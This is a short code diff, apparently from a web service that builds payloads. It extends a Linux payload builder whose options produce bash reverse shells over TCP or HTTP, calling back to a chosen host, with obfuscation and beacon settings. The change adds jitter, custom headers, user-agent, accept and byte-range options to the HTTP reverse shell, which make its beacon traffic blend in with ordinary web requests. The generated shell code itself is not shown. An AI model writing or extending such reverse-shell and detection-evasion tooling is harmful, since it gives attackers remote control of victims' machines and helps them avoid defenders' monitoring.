@@ -84,6 +84,11 @@ class LinuxPayload(BaseModel):
     obs: int = 0
     beacon: int = 5
     use_ssl: bool = False
+    jitter: int = 0
+    headers: Optional[Dict[str, str]] = None
+    useragent: Optional[str] = None
+    accept: Optional[str] = None
+    byte_range: Optional[str] = None
 
 
 # ---- Core builders (wrap generator modules) ---------------------------------
@@ -160,7 +165,7 @@ def build_linux(cfg: LinuxPayload) -> str:
     if cfg.transport.lower() == "tcp":
         return _as_text(lin_tcp.generate_bash_reverse_tcp(cfg.host, cfg.port, cfg.obs, cfg.use_ssl))
     if cfg.transport.lower() == "http":
-        return _as_text(lin_http.generate_bash_reverse_http(cfg.host, cfg.port, cfg.obs, cfg.beacon))
+        return _as_text(lin_http.generate_bash_reverse_http(cfg.host, cfg.port, cfg.obs, cfg.beacon, headers=cfg.headers, useragent=cfg.useragent, accept=cfg.accept, byte_range=cfg.byte_range, jitter=cfg.jitter))
     raise HTTPException(status_code=400, detail="Linux transport must be tcp or http")
 
 
